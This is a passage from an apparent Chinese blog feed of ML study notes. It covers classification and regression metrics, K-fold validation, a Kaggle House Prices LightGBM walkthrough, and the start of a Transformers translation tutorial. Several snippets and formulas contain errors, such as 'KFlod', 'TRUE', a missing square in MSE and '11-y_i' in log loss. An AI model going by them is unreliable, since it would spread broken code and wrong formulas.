rowspan="2" colspan="2"></th><th rowspan="1" colspan="2"><p>真实类别</p></th></tr ><tr><td><p>1</p></td><td><p>0</p></td></tr><tr><td rowspan="2"><p>预测类别</p></td><td><p>1</p></td><td><p>True Positive(TP)</p></td><td><p>False Positive(FP)</p></td></tr><tr><td><p>0</p></td><td><p>False Negative(FN)</p></td><td><p>Ture Negative(TN)</p></td></tr><table><ul><li>准确率P <span class="math inline">\(\frac{TP}{TP+FP}\)</span></li><li>召回率R <span class="math inline">\(\frac{TP}{TP+FN}\)</span></li></ul></li><li><p>F1-score</p><p><span class="math display">\[F1=2\*\frac{P\*R}{P+R}\]</span></p></li><li><p>ROC曲线</p><img src="/2021/10/10/ML-Pratice/ML-Algorithm-pratice-1/image-20211013155753941.png" class="" title="roc"><p><span class="math display">\[FPR = \frac{FP}{FP+TN}\ 负样本中的错判率(假报警率)\\\\TPR = \frac{TP}{TP+FN}\ 判对样本中的正样本率(命中率)\\\\ACC = \frac{TP+TN}{P+N}\ 判对准确率\]</span></p><p>在ROC曲线图中，横坐标为FPR，纵坐标为TPR</p></li><li><p>AUC</p><p>AUC表示ROC曲线下的面积，主要用于衡量模型的泛化性能，即分类效果的好坏。AUC是衡量二分类模型优劣的一种评价指标，表示正例排在负例前面的概率。</p><img src="/2021/10/10/ML-Pratice/ML-Algorithm-pratice-1/image-20211013162626138.png" class="" title="auc"></li><li><p>对数损失 <span class="math display">\[\log{loss}=-\log{P(Y|X)}\\\log{loss}=-\frac{1}{N}\sum_{i=1}{(y_i\log{p_i}+(11-y_i)\log{(1-p_i)}}\]</span>对数损失主要是评价模型预测的概率是否准确，它更加关注和观察数据的<strong>吻合程度</strong>，而AUC评价的则是模型把<strong>正样本排到前面</strong>的能力。</p></li></ul><h4 id="回归指标">回归指标</h4><ul><li><p>平均绝对误差 <span class="math display">\[MAE(y,y_i&#39;)=\frac{1}{m}|y_i-y_i&#39;|\]</span>在XGBoost里面，可以使用平均绝对误差作为损失函数进行模型训练，但是经常会使用Huber损失进行替换，因为平均绝对误差自0处不可导。</p></li><li><p>均方误差 <span class="math display">\[MSE(y, y&#39;)=\frac{1}{m}\sum_{i=1}^{n}{(y_i-y_i&#39;)}\]</span> 使用均方误差的模型会赋予异常点更大的权重</p></li><li><p>均方根误差 <span class="math display">\[RMSE(y, y&#39;)=\sqrt{\frac{1}{m}\sum_{i=1}^{n}{(y_i-y_i&#39;)^2}}\]</span></p></li><li><p>平均绝对百分比误差 <span class="math display">\[MAPR(y, y&#39;)=\frac{1}{m}\sum_{i=1}^n{\frac{|y_i-y_i&#39;|}{y_i&#39;}}\]</span>它是比均方根误差更加健壮的评价指标，相当于把每一个点得到误差进行了归一化，降低了个别离群点对绝对误差带来的影响。</p></li></ul><h2 id="样本选择">样本选择</h2><ul><li>数据集过大</li><li>数据噪声</li><li>数据冗余</li><li>正负样本分布不均衡</li></ul><h3 id="准确方法">准确方法</h3><ul><li>简单随机抽样</li><li>分层采样</li><li>评分加权处理</li><li>欠采样</li><li>过采样</li></ul><h2 id="线下评估策略">线下评估策略</h2><h3 id="强时序性问题">强时序性问题</h3><p>对于含有明显时间序列因素的赛题，可以将其看作是强时序性问题，即线上数据的时间都在离散数据集之后，这种情况下就可以采用时间上最接近测试集的数据做验证集，且验证集的时间分布在训练集之后。</p><h3 id="弱时序性问题">弱时序性问题</h3><p>这类问题的验证方式主要为K折交叉验证(K-fold CrossValidation),我们一般取K=5或10</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> KFold<br>NFOLDS = <span class="hljs-number">5</span><br>folds = KFlod(n_splits = NFOLDS, shuffle=TRUE, random_state = <span class="hljs-number">2021</span>)<br><span class="hljs-keyword">for</span> trn_idx, val_idx <span class="hljs-keyword">in</span> folds.split(X_train, y_train):<br>    train_df, train_label = X_train.iloc[trn_idx, :], y_train[trn_idx]<br>    valid_df, valid_label = X_train.iloc[val_idx, :], y_train[val_idx]<br></code></pre></td></tr></table></figure><h2 id="实战案例">实战案例</h2><p><ahref="https://www.kaggle.com/c/house-prices-advanced-regression-techniques">HousePrices - Advanced Regression Techniques | Kaggle</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> KFold<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> mean_squared_error<br><span class="hljs-keyword">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> OneHotEncoder<br><span class="hljs-keyword">import</span> lightgbm <span class="hljs-keyword">as</span> lgb<br><br>train = pd.read_csv(<span class="hljs-string">&#x27;../input/house-prices-advanced-regression-techniques/train.csv&#x27;</span>)<br>test = pd.read_csv(<span class="hljs-string">&#x27;../input/house-prices-advanced-regression-techniques/test.csv&#x27;</span>)<br><br>train.describe()<br><br><span class="hljs-comment"># 对数据进行基本处理</span><br>all_data = pd.concat((train, test))<br><span class="hljs-comment"># one-hot编码</span><br>all_data = pd.get_dummies(all_data)<br><span class="hljs-comment"># 填充缺失值</span><br>all_data = all_data.fillna(all_data.mean())<br><span class="hljs-comment"># 数据切分</span><br>X_train = all_data[:train.shape[<span class="hljs-number">0</span>]]<br>X_test = all_data[train.shape[<span class="hljs-number">0</span>]:]<br>y = train.SalePrice<br><br><span class="hljs-comment"># K折交叉验证</span><br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> KFold<br>folds = KFold(n_splits=<span class="hljs-number">5</span>, shuffle=<span class="hljs-literal">True</span>, random_state=<span class="hljs-number">2021</span>)<br><span class="hljs-comment"># 模型参数</span><br>params = &#123;<span class="hljs-string">&#x27;num_leaves&#x27;</span>: <span class="hljs-number">63</span>, <span class="hljs-string">&#x27;min_child_samples&#x27;</span>: <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;objective&#x27;</span>: <span class="hljs-string">&#x27;regression&#x27;</span>, <span class="hljs-string">&#x27;learning_rate&#x27;</span>: <span class="hljs-number">0.01</span>,<br>         <span class="hljs-string">&#x27;boosting_type&#x27;</span>: <span class="hljs-string">&#x27;gbdt&#x27;</span>, <span class="hljs-string">&#x27;metric&#x27;</span>: <span class="hljs-string">&#x27;rmse&#x27;</span>&#125;<br><br><span class="hljs-keyword">for</span> trn_idx, val_idx <span class="hljs-keyword">in</span> folds.split(X_train, y):<br>    trn_df, trn_label = X_train.iloc[trn_idx, :], y[trn_idx]<br>    val_df, val_label = X_train.iloc[val_idx, :], y[val_idx]<br>    dtrn = lgb.Dataset(trn_df, label=trn_label)<br>    dval = lgb.Dataset(val_df, label=val_label)<br>    bst = lgb.train(params, dtrn, num_boost_round=<span class="hljs-number">1000</span>, valid_sets=[dtrn, dval], <br>                   early_stopping_rounds=<span class="hljs-number">100</span>, verbose_eval=<span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure><h1 id="数据探索">数据探索</h1><h2 id="数据初探">数据初探</h2><h3 id="分析方法">分析方法</h3><ul><li>单变量可视化分析</li><li>多变量可视化分析</li><li>降维分析</li></ul><h3 id="明确目的">明确目的</h3><ul><li>数据集的基本情况</li><li>重复值，缺失值和异常值</li><li>特征之间是否冗余</li><li>是否存在时间信息</li><li>标签分布</li><li>训练集与测试集的分布</li><li>单变量/多变量分布</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">stats = []<br><span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> train.columns:<br>    stats.append((col, train[col].nunique(), train[col].isnull().<span class="hljs-built_in">sum</span>() * <span class="hljs-number">100</span> / train.shape[<span class="hljs-number">0</span>], train[col].value_counts(normalize=<span class="hljs-literal">True</span>, dropna=<span class="hljs-literal">False</span>).values[<span class="hljs-number">0</span>] * <span class="hljs-number">100</span>, train[col].dtype))<br>stats_df = pd.DataFrame(stats, columns=[<span class="hljs-string">&#x27;Feature&#x27;</span>, <span class="hljs-string">&#x27;Unique_values&#x27;</span>, <span class="hljs-string">&#x27;Percentage of missing values&#x27;</span>, <span class="hljs-string">&#x27;Percentage of values in the biggest category&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>])<br>stats_df.sort_values(<span class="hljs-string">&#x27;Percentage of missing values&#x27;</span>, ascending=<span class="hljs-literal">False</span>)[:<span class="hljs-number">10</span>]<br></code></pre></td></tr></table></figure><img src="/2021/10/10/ML-Pratice/ML-Algorithm-pratice-1/image-20211013203532159.png" class="" title="data-explore"><p>变量缺失值可视化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">missing = train.isnull().<span class="hljs-built_in">sum</span>()<br>missing = missing[missing &gt; <span class="hljs-number">0</span>]<br>missing.sort_values(inplace=<span class="hljs-literal">True</span>)<br>missing.plot.bar()<br></code></pre></td></tr></table></figure><figure><img src="https://i.loli.net/2021/10/13/O51Pn73D8duSbp2.png"alt="image-20211013203717886" /><figcaption aria-hidden="true">image-20211013203717886</figcaption></figure><h2 id="变量分析">变量分析</h2><h3 id="单变量分析">单变量分析</h3><h4 id="标签">标签</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">train[<span class="hljs-string">&#x27;SalePrice&#x27;</span>].describe()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scipy.stats <span class="hljs-keyword">as</span> st<br>plt.figure(figsize=(<span class="hljs-number">9</span>, <span class="hljs-number">8</span>))<br>sns.distplot(np.log(train[<span class="hljs-string">&#x27;SalePrice&#x27;</span>]), color=<span class="hljs-string">&#x27;b&#x27;</span>, bins=<span class="hljs-number">100</span>, hist_kws=&#123;<span class="hljs-string">&#x27;alpha&#x27;</span>: <span class="hljs-number">0.4</span>&#125;)<br></code></pre></td></tr></table></figure><img src="/2021/10/10/ML-Pratice/ML-Algorithm-pratice-1/image-20211013204032355.png" class="" title="image-20211013204032355"><h4 id="连续型">连续型</h4><p>相似性矩阵</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">corrmat = train.corr()<br>f, ax = plt.subplots(figsize=(<span class="hljs-number">20</span>, <span class="hljs-number">9</span>))<br>sns.heatmap(corrmat, vmax=<span class="hljs-number">0.8</span>, square=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><img src="/2021/10/10/ML-Pratice/ML-Algorithm-pratice-1/image-20211013204311003.png" class="" title="image-20211013204311003"><h3 id="多变量分析">多变量分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 房屋位置和评价的关系</span><br>plt.style.use(<span class="hljs-string">&#x27;seaborn-white&#x27;</span>)<br>type_cluster = train.groupby([<span class="hljs-string">&#x27;Neighborhood&#x27;</span>,<span class="hljs-string">&#x27;OverallQual&#x27;</span>]).size()<br>type_cluster.unstack().plot(kind=<span class="hljs-string">&#x27;bar&#x27;</span>,stacked=<span class="hljs-literal">True</span>, colormap= <span class="hljs-string">&#x27;PuBu&#x27;</span>, figsize=(<span class="hljs-number">13</span>,<span class="hljs-number">11</span>),  grid=<span class="hljs-literal">False</span>)<br>plt.xlabel(<span class="hljs-string">&#x27;OverallQual&#x27;</span>, fontsize=<span class="hljs-number">16</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><img src="/2021/10/10/ML-Pratice/ML-Algorithm-pratice-1/image-20211013204456599.png" class="" title="image-20211013204456599"><h2 id="模型分析">模型分析</h2><h3 id="学习曲线">学习曲线</h3><ul><li>欠拟合学习曲线</li><li>过拟合学习曲线</li></ul><h3 id="特征重要性分析">特征重要性分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> Ridge, RidgeCV, ElasticNet, LassoCV, LassoLarsCV<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> cross_val_score<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rmse_cv</span>(<span class="hljs-params">model</span>):<br>    rmse= np.sqrt(-cross_val_score(model, X_train, y, scoring=<span class="hljs-string">&quot;neg_mean_squared_error&quot;</span>, cv = <span class="hljs-number">5</span>))<br>    <span class="hljs-keyword">return</span>(rmse)<br><br>model_ridge = Ridge()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">alphas = [<span class="hljs-number">0.05</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">0.3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">30</span>, <span class="hljs-number">50</span>, <span class="hljs-number">75</span>]<br>cv_ridge = [rmse_cv(Ridge(alpha = alpha)).mean() <br>            <span class="hljs-keyword">for</span> alpha <span class="hljs-keyword">in</span> alphas]<br>            <br>cv_ridge = pd.Series(cv_ridge, index = alphas)<br>cv_ridge.plot(title = <span class="hljs-string">&quot;Validation&quot;</span>)<br>plt.xlabel(<span class="hljs-string">&quot;alpha&quot;</span>)<br>plt.ylabel(<span class="hljs-string">&quot;rmse&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/2021/10/10/ML-Pratice/ML-Algorithm-pratice-1/image-20211013205338503.png" class="" title="image-20211013205338503"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">model_lasso = LassoCV(alphas = [<span class="hljs-number">1</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">0.001</span>, <span class="hljs-number">0.0005</span>]).fit(X_train, y)<br><br>coef = pd.Series(model_lasso.coef_, index = X_train.columns)<br><br><span class="hljs-keyword">import</span> matplotlib<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>imp_coef = pd.concat([coef.sort_values().head(<span class="hljs-number">10</span>),<br>                     coef.sort_values().tail(<span class="hljs-number">10</span>)])<br>matplotlib.rcParams[<span class="hljs-string">&#x27;figure.figsize&#x27;</span>] = (<span class="hljs-number">8.0</span>, <span class="hljs-number">10.0</span>)<br>imp_coef.plot(kind = <span class="hljs-string">&quot;barh&quot;</span>)<br>plt.title(<span class="hljs-string">&quot;Coefficients in the Lasso Model&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/2021/10/10/ML-Pratice/ML-Algorithm-pratice-1/image-20211013205454251.png" class="" title="image-20211013205454251">]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>竞赛实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于Transformers的自然语言处理(NLP)入门(六)</title>
    <link href="/2021/09/28/nlp-transformer/nlp-transformer-6/"/>
    <url>/2021/09/28/nlp-transformer/nlp-transformer-6/</url>
    
    <content type="html"><![CDATA[<p>本文为参加Datawhale组队学习时所写，如若需了解细致内容，请去到Datawhale官方开源课程<ahref="https://datawhalechina.github.io/learn-nlp-with-transformers/#/">基于transformers的自然语言处理(NLP)入门(datawhalechina.github.io)</a></p><h1 id="机器翻译任务">机器翻译任务</h1><p>在这个小节中，我们将展示如何使用<ahref="https://github.com/huggingface/transformers">🤗Transformers</a>代码库中的模型来解决自然语言处理中的翻译任务。我们将会使用<ahref="http://www.statmt.org/wmt16/">WMTdataset</a>数据集。这是翻译任务最常用的数据集之一。</p><p>对于翻译任务，我们将展示如何使用简单的加载数据集，同时针对相应的仍无使用transformer中的Trainer接口对模型进行微调。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">model_checkpoint = <span class="hljs-string">&quot;Helsinki-NLP/opus-mt-en-ro&quot;</span>   <span class="hljs-comment"># 选择一个模型checkpoint</span><br></code></pre></td></tr></table></figure><p>本文我们使用已经训练好的<ahref="https://huggingface.co/Helsinki-NLP/opus-mt-en-ro"><code>Helsinki-NLP/opus-mt-en-ro</code></a>checkpoint来做翻译任务。</p><span id="more"></span><h2 id="加载数据">加载数据</h2><p>数据加载和评测方式加载只需要简单使用load_dataset和load_metric即可。我们使用WMT数据集中的English/Romanian双语翻译。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datasets <span class="hljs-keyword">import</span> load_dataset, load_metric<br><br>raw_datasets = load_dataset(<span class="hljs-string">&quot;wmt16&quot;</span>, <span class="hljs-string">&quot;ro-en&quot;</span>)<br>metric = load_metric(<span class="hljs-string">&quot;sacrebleu&quot;</span>)<br></code></pre></td></tr></table></figure><p>dataset结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">DatasetDict(&#123;<br>    train: Dataset(&#123;<br>        features: [<span class="hljs-string">&#x27;translation&#x27;</span>],<br>        num_rows: <span class="hljs-number">610320</span><br>    &#125;)<br>    validation: Dataset(&#123;<br>        features: [<span class="hljs-string">&#x27;translation&#x27;</span>],<br>        num_rows: <span class="hljs-number">1999</span><br>    &#125;)<br>    test: Dataset(&#123;<br>        features: [<span class="hljs-string">&#x27;translation&#x27;</span>],<br>        num_rows: <span class="hljs-number">1999</span><br>    &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>随机选取数据进行展示</p><img src="/2021/09/28/nlp-transformer/nlp-transformer-6/image-20210928164306279.png" class="" title="dataset"><p>我们使用<code>metric</code>中的<code>compute</code>方法来对比predictions和labels，从而计算得分。predictions和labels都需要是一个list。具体格式见下面的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_preds = [<span class="hljs-string">&quot;hello there&quot;</span>, <span class="hljs-string">&quot;general kenobi&quot;</span>]<br>fake_labels = [[<span class="hljs-string">&quot;hello there&quot;</span>], [<span class="hljs-string">&quot;general kenobi&quot;</span>]]<br>metric.compute(predictions=fake_preds, references=fake_labels)<br></code></pre></td></tr></table></figure><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<span class="hljs-string">&#x27;score&#x27;</span>: <span class="hljs-number">0.0</span>,<br> <span class="hljs-string">&#x27;counts&#x27;</span>: [<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br> <span class="hljs-string">&#x27;totals&#x27;</span>: [<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br> <span class="hljs-string">&#x27;precisions&#x27;</span>: [<span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>],<br> <span class="hljs-string">&#x27;bp&#x27;</span>: <span class="hljs-number">1.0</span>,<br> <span class="hljs-string">&#x27;sys_len&#x27;</span>: <span class="hljs-number">4</span>,<br> <span class="hljs-string">&#x27;ref_len&#x27;</span>: <span class="hljs-number">4</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="数据预处理">数据预处理</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> transformer <span class="hljs-keyword">import</span> AutoTokenizer<br><br>tokenizer = AutoTokenizer.from_pretrained(model_checkpoint)<br></code></pre></td></tr></table></figure><p>以我们使用的mBART模型为例，我们需要正确设置source语言和target语言。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;mbart&quot;</span> <span class="hljs-keyword">in</span> model_checkpoint:<br>    tokenizer.src_lang = <span class="hljs-string">&quot;en-XX&quot;</span><br>    tokenizer.tgt_lang = <span class="hljs-string">&quot;ro-RO&quot;</span><br></code></pre></td></tr></table></figure><p>tokenIDs也就是input_ids一般来说随着预训练模型名字的不同而有所不同。原因是不同的预训练模型在预训练的时候设定了不同的规则。但只要tokenizer和model的名字一致，那么tokenizer预处理的输入格式就会满足model需求的。</p><p>为了给模型准备好翻译的targets，我们使用<code>as_target_tokenizer</code>来控制targets所对应的特殊token：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> tokenizer.as_target_tokenizer():<br>    <span class="hljs-built_in">print</span>(tokenizer(<span class="hljs-string">&quot;Hello, this one sentence!&quot;</span>))<br>    model_input = tokenizer(<span class="hljs-string">&quot;Hello, this one sentence!&quot;</span>)<br>    tokens = tokenizer.convert_ids_to_tokens(model_input[<span class="hljs-string">&#x27;input_ids&#x27;</span>])<br>    <span class="hljs-comment"># 打印看一下special toke</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;tokens: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(tokens))<br></code></pre></td></tr></table></figure><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<span class="hljs-string">&#x27;input_ids&#x27;</span>: [<span class="hljs-number">10334</span>, <span class="hljs-number">1204</span>, <span class="hljs-number">3</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8915</span>, <span class="hljs-number">27</span>, <span class="hljs-number">452</span>, <span class="hljs-number">59</span>, <span class="hljs-number">29579</span>, <span class="hljs-number">581</span>, <span class="hljs-number">23</span>, <span class="hljs-number">0</span>], <span class="hljs-string">&#x27;attention_mask&#x27;</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]&#125;<br>tokens: [<span class="hljs-string">&#x27;▁Hel&#x27;</span>, <span class="hljs-string">&#x27;lo&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;▁&#x27;</span>, <span class="hljs-string">&#x27;this&#x27;</span>, <span class="hljs-string">&#x27;▁o&#x27;</span>, <span class="hljs-string">&#x27;ne&#x27;</span>, <span class="hljs-string">&#x27;▁se&#x27;</span>, <span class="hljs-string">&#x27;nten&#x27;</span>, <span class="hljs-string">&#x27;ce&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;&lt;/s&gt;&#x27;</span>]<br></code></pre></td></tr></table></figure><p>如果您使用的是T5预训练模型的checkpoints，需要对特殊的前缀进行检查。T5使用特殊的前缀来告诉模型具体要做的任务，具体前缀例子如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> model_checkpoint <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;t5-small&quot;</span>, <span class="hljs-string">&quot;t5-base&quot;</span>, <span class="hljs-string">&quot;t5-larg&quot;</span>, <span class="hljs-string">&quot;t5-3b&quot;</span>, <span class="hljs-string">&quot;t5-11b&quot;</span>]:<br>    prefix = <span class="hljs-string">&quot;translate English to Romanian: &quot;</span><br><span class="hljs-keyword">else</span>:<br>    prefix = <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>现在我们可以把所有内容放在一起组成我们的预处理函数了。我们对样本进行预处理的时候，我们还会<code>truncation=True</code>这个参数来确保我们超长的句子被截断。默认情况下，对与比较短的句子我们会自动padding。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">max_input_length = <span class="hljs-number">128</span><br>max_target_length = <span class="hljs-number">128</span><br>source_lang = <span class="hljs-string">&quot;en&quot;</span><br>target_lang = <span class="hljs-string">&quot;ro&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">preprocess_function</span>(<span class="hljs-params">examples</span>):<br>    inputs = [prefix + ex[source_lang] <span class="hljs-keyword">for</span> ex <span class="hljs-keyword">in</span> examples[<span class="hljs-string">&quot;translation&quot;</span>]]<br>    targets = [ex[target_lang] <span class="hljs-keyword">for</span> ex <span class="hljs-keyword">in</span> examples[<span class="hljs-string">&quot;translation&quot;</span>]]<br>    model_inputs = tokenizer(inputs, max_length=max_input_length, truncation=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment"># Setup the tokenizer for targets</span><br>    <span class="hljs-keyword">with</span> tokenizer.as_target_tokenizer():<br>        labels = tokenizer(targets, max_length=max_target_length, truncation=<span class="hljs-literal">True</span>)<br><br>    model_inputs[<span class="hljs-string">&quot;labels&quot;</span>] = labels[<span class="hljs-string">&quot;input_ids&quot;</span>]<br>    <span class="hljs-keyword">return</span> model_inputs<br></code></pre></td></tr></table></figure><p>接下来对数据集datasets里面的所有样本进行预处理，处理的方式是使用map函数，将预处理函数prepare_train_features应用到（map)所有样本上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tokenized_datasets = raw_datasets.<span class="hljs-built_in">map</span>(preprocess_function, batched=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h2 id="fine-tuning微调模型">Fine-tuning微调模型</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoModelForSeq2SeqLM, DataCollatorForSeq2Seq, Seq2SeqTrainingArguments, Seq2SeqTrainer<br><br>model = AutoModelForSeq2SeqLM.from_pretrained(model_checkpoint)<br></code></pre></td></tr></table></figure><p>模型参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 